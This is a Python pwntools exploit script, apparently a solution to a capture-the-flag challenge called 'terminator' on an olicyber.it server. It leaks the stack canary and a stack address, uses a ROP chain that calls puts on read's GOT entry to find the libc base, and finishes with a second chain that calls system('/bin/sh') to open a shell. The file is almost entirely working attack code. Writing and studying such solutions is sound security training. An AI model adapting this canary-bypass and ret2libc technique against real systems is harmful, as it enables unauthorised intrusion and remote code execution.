#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template terminator '--lib=libc.so.6' '--host=terminator.challs.olicyber.it' '--port=10307'
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'terminator')
context.terminal = ["alacritty", "-e", "zsh", "-c"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'terminator.challs.olicyber.it'
port = int(args.PORT or 10307)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:  
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

io = start()

payload = b"A" * 56
io.sendafter(b"> ", payload)
io.recvline()

canary = u64(b'\x00' + io.recv(7))
stack = u64(io.recv(6) + b'\x00\x00')

log.info(f"Canary: {hex(canary)}")
log.info(f"Stack: {hex(stack)}")

OFFSET = 0x60

payload = b"DDDDDDDD"
payload += p64(0x00000000004012fb) # pop rdi ; ret
payload += p64(exe.got.read)
payload += p64(exe.plt["puts"])
payload += p64(exe.sym["main"])
payload += b"D" * (56 - len(payload))
payload += p64(canary)
payload += p64(stack - OFFSET)

io.sendlineafter(b"> ", payload)
io.recvline()
leak = u64(io.recvline()[:-1].ljust(8, b"\x00"))

LIBC_BASE = leak - libc.sym.read
log.info(f"read_leak: {hex(leak)}")
log.info(f"libc_base: {hex(LIBC_BASE)}")

OFFSET = 0xa8
# 897  0x001d8698 0x001d8698 7   8    .rodata ascii   /bin/sh
# 0x00000000004012fb : pop rdi ; ret

binsh = 0x001d8698
payload = p64(0x00000000004012fb) # pop rdi ; ret
payload += p64(LIBC_BASE + binsh)
payload += p64(LIBC_BASE + libc.sym.system)
payload += b"D" * (56 - len(payload))
payload += p64(canary)
payload += p64(stack - OFFSET)

io.sendlineafter(b"> ", payload)
io.interactive()


